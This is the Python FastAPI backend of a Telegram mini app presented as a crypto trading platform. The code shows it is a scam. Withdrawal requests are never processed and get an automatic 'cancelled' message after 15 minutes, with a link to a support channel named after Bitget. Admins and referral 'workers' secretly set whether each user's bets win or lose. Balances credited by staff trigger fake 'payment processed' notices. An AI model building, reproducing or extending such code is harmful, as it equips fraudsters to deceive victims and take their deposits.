from __future__ import annotations

import asyncio
import logging
import time
from contextlib import asynccontextmanager

from fastapi import FastAPI, HTTPException, Request, status
from fastapi.responses import HTMLResponse
from fastapi.staticfiles import StaticFiles
from fastapi.templating import Jinja2Templates
from pydantic import BaseModel
from telegram import Bot, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.error import TelegramError

from .auth import (
    AdminAccessError,
    ensure_admin_access,
    ensure_owner,
    is_owner_account,
    validate_init_data,
)
from .config import Settings, get_settings
from .market_data import (
    get_current_price,
    get_klines as fetch_klines,
    get_ticker24h as fetch_ticker24h,
)
from .storage import (
    CURRENCY_RUB_RATES,
    SUPPORTED_CURRENCIES,
    UserStorage,
    normalize_currency,
    normalize_username,
)

logger = logging.getLogger(__name__)
SUPPORT_URL = "https://t.me/bitget_help_center"
WITHDRAWAL_CANCELLATION_DELAY_SECONDS = 900
WITHDRAWAL_CANCELLED_TEXT = (
    "❌ Выплата была автоматически отменена. "
    "Для уточнения информации и решения вопроса обратитесь в службу поддержки."
)


class BetRequest(BaseModel):
    direction: str
    amount: float
    symbol: str = "BTCUSDT"
    duration: int = 60


class OutcomeRequest(BaseModel):
    telegram_id: int
    setting: str


class BalanceRequest(BaseModel):
    telegram_id: int
    amount: float
    mode: str = "add"


class CurrencyRequest(BaseModel):
    currency: str


class WithdrawRequest(BaseModel):
    amount: float = 0


def current_server_time() -> float:
    return time.time()


def format_payment_amount(amount: float, currency: str) -> str:
    value = round(float(amount), 2)
    if value.is_integer():
        amount_text = str(int(value))
    else:
        amount_text = f"{value:.2f}".rstrip("0").rstrip(".")
    return f"{amount_text} {normalize_currency(currency)}"


def build_balance_payment_message(amount: float, currency: str) -> str:
    return (
        "✅ Оплата на сумму "
        f"{format_payment_amount(amount, currency)} "
        "успешно обработана. Средства моментально зачислены на ваш баланс!"
    )


async def send_balance_payment_message(
    settings: Settings,
    telegram_id: int,
    amount: float,
    currency: str,
) -> bool:
    if amount <= 0 or not settings.bot_token:
        return False

    try:
        async with Bot(settings.bot_token) as bot:
            await bot.send_message(
                chat_id=telegram_id,
                text=build_balance_payment_message(amount, currency),
            )
    except TelegramError as exc:
        logger.warning(
            "balance payment notification failed for %s: %s",
            telegram_id,
            exc,
        )
        return False
    return True


async def send_withdrawal_cancelled_message(
    settings: Settings,
    telegram_id: int,
) -> bool:
    if not settings.bot_token:
        return False

    try:
        async with Bot(settings.bot_token) as bot:
            await bot.send_message(
                chat_id=telegram_id,
                text=WITHDRAWAL_CANCELLED_TEXT,
                reply_markup=InlineKeyboardMarkup(
                    [[InlineKeyboardButton("Тех поддержка", url=SUPPORT_URL)]]
                ),
            )
    except TelegramError as exc:
        logger.warning(
            "withdrawal cancellation notification failed for %s: %s",
            telegram_id,
            exc,
        )
        return False
    return True


async def schedule_withdrawal_cancellation(
    settings: Settings,
    telegram_id: int,
) -> None:
    await asyncio.sleep(WITHDRAWAL_CANCELLATION_DELAY_SECONDS)
    await send_withdrawal_cancelled_message(settings, telegram_id)


async def _bet_resolver(storage: UserStorage) -> None:
    while True:
        try:
            expired = storage.get_pending_expired_bets()
            for bet in expired:
                try:
                    price = await get_current_price(bet.get("symbol") or "BTCUSDT")
                except Exception:
                    price = float(bet["entry_price"])
                storage.resolve_bet(bet["id"], price)
        except Exception as exc:  # pragma: no cover - background safety
            logger.warning("bet resolver: %s", exc)
        await asyncio.sleep(10)


def create_app(settings: Settings, storage: UserStorage) -> FastAPI:
    @asynccontextmanager
    async def lifespan(app: FastAPI):
        task = asyncio.create_task(_bet_resolver(storage))
        yield
        task.cancel()

    app = FastAPI(title="CryptoTrade Mini App", lifespan=lifespan)
    templates = Jinja2Templates(directory=str(settings.templates_dir))
    app.mount("/static", StaticFiles(directory=str(settings.static_dir)), name="static")

    def get_asset_version() -> str:
        asset_paths = (
            settings.static_dir / "css" / "styles.css",
            settings.static_dir / "js" / "app.js",
            settings.templates_dir / "index.html",
        )
        latest = max(
            (path.stat().st_mtime_ns for path in asset_paths if path.exists()),
            default=0,
        )
        return str(latest)

    def filter_owner_visible_users(users: list[dict]) -> list[dict]:
        worker_usernames = {
            item["username"]
            for item in storage.list_workers()
            if item.get("username") and not item.get("is_test")
        }

        filtered = []
        for user in users:
            username = normalize_username(user.get("username"))
            if is_owner_account(int(user["telegram_id"]), username, settings):
                continue
            if username and username in worker_usernames:
                continue
            filtered.append(user)

        return filtered

    @app.get("/", response_class=HTMLResponse)
    async def index(request: Request) -> HTMLResponse:
        response = templates.TemplateResponse(
            request,
            "index.html",
            {
                "request": request,
                "asset_version": get_asset_version(),
            },
        )
        response.headers["Cache-Control"] = "no-store, no-cache, must-revalidate, max-age=0"
        response.headers["Pragma"] = "no-cache"
        response.headers["Expires"] = "0"
        return response

    @app.get("/health")
    async def health() -> dict:
        return {"status": "ok", "server_time": current_server_time()}

    @app.get("/api/price/{symbol}")
    async def get_price(symbol: str) -> dict:
        try:
            price = await get_current_price(symbol)
        except Exception as exc:
            raise HTTPException(502, "Price fetch failed") from exc
        return {"symbol": symbol.upper(), "price": str(price)}

    @app.get("/api/ticker24h/{symbol}")
    async def get_ticker24h(symbol: str) -> dict:
        try:
            return await fetch_ticker24h(symbol)
        except Exception as exc:
            raise HTTPException(502, "Ticker fetch failed") from exc

    @app.get("/api/klines/{symbol}")
    async def get_klines(symbol: str, interval: str = "1m", limit: int = 80) -> list:
        try:
            return await fetch_klines(symbol, interval=interval, limit=limit)
        except Exception as exc:
            raise HTTPException(502, "Klines fetch failed") from exc

    @app.get("/api/me")
    async def get_me(request: Request) -> dict:
        init_data = request.headers.get("X-Telegram-Init-Data", "")
        try:
            tg_user = validate_init_data(init_data, settings.bot_token)
        except Exception as exc:
            raise HTTPException(401, "Unauthorized") from exc

        user = storage.upsert_user(
            {
                "telegram_id": tg_user.telegram_id,
                "username": tg_user.username,
                "first_name": tg_user.first_name,
                "last_name": tg_user.last_name,
            }
        )
        bets = storage.get_user_bets(tg_user.telegram_id)
        active = next((bet for bet in bets if bet["status"] == "pending"), None)
        return {
            "telegram_id": user["telegram_id"],
            "username": user.get("username"),
            "first_name": user.get("first_name"),
            "balance": user.get("balance", 0.0),
            "currency": user.get("currency", "RUB"),
            "currency_rates": CURRENCY_RUB_RATES,
            "active_bet": active,
            "worker_code": user.get("worker_code"),
            "worker_username": user.get("worker_username"),
            "server_time": current_server_time(),
        }

    @app.get("/api/bets")
    async def get_bets(request: Request) -> dict:
        init_data = request.headers.get("X-Telegram-Init-Data", "")
        try:
            tg_user = validate_init_data(init_data, settings.bot_token)
        except Exception as exc:
            raise HTTPException(401, "Unauthorized") from exc
        bets = storage.get_user_bets(tg_user.telegram_id)
        user = storage.get_user(tg_user.telegram_id)
        return {
            "bets": bets,
            "balance": user.get("balance", 0.0) if user else 0.0,
            "currency": user.get("currency", "RUB") if user else "RUB",
            "server_time": current_server_time(),
        }

    @app.post("/api/me/currency")
    async def set_me_currency(request: Request, body: CurrencyRequest) -> dict:
        init_data = request.headers.get("X-Telegram-Init-Data", "")
        try:
            tg_user = validate_init_data(init_data, settings.bot_token)
        except Exception as exc:
            raise HTTPException(401, "Unauthorized") from exc

        requested_currency = str(body.currency or "").strip().upper()
        if requested_currency not in SUPPORTED_CURRENCIES:
            raise HTTPException(400, "currency must be RUB, USD, or BYN")
        currency = normalize_currency(requested_currency)
        try:
            saved = storage.set_currency(tg_user.telegram_id, currency)
        except ValueError as exc:
            raise HTTPException(400, str(exc)) from exc
        if saved is None:
            storage.upsert_user(
                {
                    "telegram_id": tg_user.telegram_id,
                    "username": tg_user.username,
                    "first_name": tg_user.first_name,
                    "last_name": tg_user.last_name,
                    "currency": currency,
                }
            )
            saved = {
                "currency": currency,
                "balance": 0.0,
                "previous_currency": currency,
                "previous_balance": 0.0,
            }
        return {
            "ok": True,
            **saved,
            "currency_rates": CURRENCY_RUB_RATES,
            "server_time": current_server_time(),
        }

    @app.post("/api/bet")
    async def place_bet(request: Request, body: BetRequest) -> dict:
        init_data = request.headers.get("X-Telegram-Init-Data", "")
        try:
            tg_user = validate_init_data(init_data, settings.bot_token)
        except Exception as exc:
            raise HTTPException(401, "Unauthorized") from exc

        if body.direction not in ("up", "down"):
            raise HTTPException(400, "direction must be 'up' or 'down'")
        if body.amount <= 0:
            raise HTTPException(400, "amount must be positive")
        if body.duration not in (60, 300, 900):
            raise HTTPException(400, "duration must be 60, 300, or 900")

        try:
            entry_price = await get_current_price(body.symbol)
        except Exception as exc:
            raise HTTPException(502, "Cannot fetch current price") from exc

        try:
            bet = storage.place_bet(
                telegram_id=tg_user.telegram_id,
                amount=body.amount,
                direction=body.direction,
                symbol=body.symbol.upper(),
                entry_price=entry_price,
                duration_seconds=body.duration,
            )
        except ValueError as exc:
            raise HTTPException(400, str(exc)) from exc

        user = storage.get_user(tg_user.telegram_id)
        return {
            "bet": bet,
            "balance": user.get("balance", 0.0) if user else 0.0,
            "currency": user.get("currency", "RUB") if user else "RUB",
            "server_time": current_server_time(),
        }

    @app.post("/api/withdraw")
    async def request_withdrawal(request: Request, body: WithdrawRequest) -> dict:
        init_data = request.headers.get("X-Telegram-Init-Data", "")
        try:
            tg_user = validate_init_data(init_data, settings.bot_token)
        except Exception as exc:
            raise HTTPException(401, "Unauthorized") from exc

        storage.upsert_user(
            {
                "telegram_id": tg_user.telegram_id,
                "username": tg_user.username,
                "first_name": tg_user.first_name,
                "last_name": tg_user.last_name,
            }
        )
        asyncio.create_task(
            schedule_withdrawal_cancellation(settings, tg_user.telegram_id)
        )
        return {"ok": True, "server_time": current_server_time()}

    @app.get("/api/admin/access")
    async def admin_access(request: Request) -> dict:
        init_data = request.headers.get("X-Telegram-Init-Data", "")
        try:
            admin = ensure_admin_access(init_data, settings, storage)
        except AdminAccessError as exc:
            raise HTTPException(status.HTTP_403_FORBIDDEN, str(exc)) from exc

        clients_total = 0
        if admin.role == "worker" and admin.worker_code:
            clients_total = len(storage.list_referred_users(worker_code=admin.worker_code))

        return {
            "admin": {
                "telegram_id": admin.telegram_id,
                "username": admin.username,
                "display_name": admin.display_name,
                "role": admin.role,
                "worker_code": admin.worker_code,
                "clients_total": clients_total,
            }
        }

    @app.get("/api/admin/users")
    async def admin_users(request: Request) -> dict:
        init_data = request.headers.get("X-Telegram-Init-Data", "")
        try:
            admin = ensure_admin_access(init_data, settings, storage)
        except AdminAccessError as exc:
            raise HTTPException(status.HTTP_403_FORBIDDEN, str(exc)) from exc

        if admin.role == "worker":
            if not admin.worker_code:
                raise HTTPException(403, "Worker code is missing")
            users = storage.list_referred_users(worker_code=admin.worker_code)
        else:
            users = filter_owner_visible_users(storage.list_users())

        return {
            "admin": {
                "telegram_id": admin.telegram_id,
                "username": admin.username,
                "role": admin.role,
                "worker_code": admin.worker_code,
            },
            "users": users,
            "total": len(users),
        }

    @app.post("/api/admin/outcome")
    async def admin_set_outcome(request: Request, body: OutcomeRequest) -> dict:
        init_data = request.headers.get("X-Telegram-Init-Data", "")
        try:
            admin = ensure_admin_access(init_data, settings, storage)
        except AdminAccessError as exc:
            raise HTTPException(403, str(exc)) from exc
        if body.setting not in ("win", "lose", "random"):
            raise HTTPException(400, "setting must be win, lose, or random")
        user = storage.get_user(body.telegram_id)
        if user is None:
            raise HTTPException(404, "User not found")
        if admin.role == "worker":
            if str(user.get("worker_code") or "") != str(admin.worker_code):
                raise HTTPException(403, "Worker can only edit own clients")
        ok = storage.set_outcome_setting(body.telegram_id, body.setting)
        if not ok:
            raise HTTPException(404, "User not found")
        return {"ok": True}

    @app.post("/api/admin/balance")
    async def admin_set_balance(request: Request, body: BalanceRequest) -> dict:
        init_data = request.headers.get("X-Telegram-Init-Data", "")
        try:
            admin = ensure_admin_access(init_data, settings, storage)
        except AdminAccessError as exc:
            raise HTTPException(403, str(exc)) from exc
        mode = body.mode if body.mode in ("add", "set") else "add"
        if mode == "add" and body.amount <= 0:
            raise HTTPException(400, "amount must be positive")
        if mode == "set" and body.amount < 0:
            raise HTTPException(400, "amount must not be negative")
        user = storage.get_user(body.telegram_id)
        if user is None:
            raise HTTPException(404, "User not found")
        if admin.role == "worker":
            if str(user.get("worker_code") or "") != str(admin.worker_code):
                raise HTTPException(403, "Worker can only edit own clients")
        currency = normalize_currency(user.get("currency"))
        credited_amount = round(float(body.amount), 2)
        if mode == "set":
            new_balance = storage.set_balance(body.telegram_id, credited_amount)
        else:
            new_balance = storage.add_balance(body.telegram_id, credited_amount)
        if new_balance is None:
            raise HTTPException(404, "User not found")
        notified = False
        if mode == "add":
            notified = await send_balance_payment_message(
                settings,
                body.telegram_id,
                credited_amount,
                currency,
            )
        return {
            "ok": True,
            "balance": new_balance,
            "currency": currency,
            "credited_amount": max(credited_amount, 0),
            "notified": notified,
            "mode": mode,
        }

    @app.get("/api/admin/bets")
    async def admin_bets(request: Request) -> dict:
        init_data = request.headers.get("X-Telegram-Init-Data", "")
        try:
            admin = ensure_admin_access(init_data, settings, storage)
        except AdminAccessError as exc:
            raise HTTPException(403, str(exc)) from exc

        worker_code = admin.worker_code if admin.role == "worker" else None
        bets = storage.get_all_bets(
            include_profiles=True,
            worker_code=worker_code,
        )
        return {
            "role": admin.role,
            "worker_code": admin.worker_code,
            "bets": bets,
        }

    @app.get("/api/admin/workers")
    async def admin_workers(request: Request) -> dict:
        init_data = request.headers.get("X-Telegram-Init-Data", "")
        try:
            ensure_owner(init_data, settings)
        except AdminAccessError as exc:
            raise HTTPException(403, str(exc)) from exc
        return {"workers": storage.list_workers()}

    return app


_default_settings = get_settings()
app = create_app(
    _default_settings,
    UserStorage(_default_settings.data_dir, database_url=_default_settings.database_url),
)
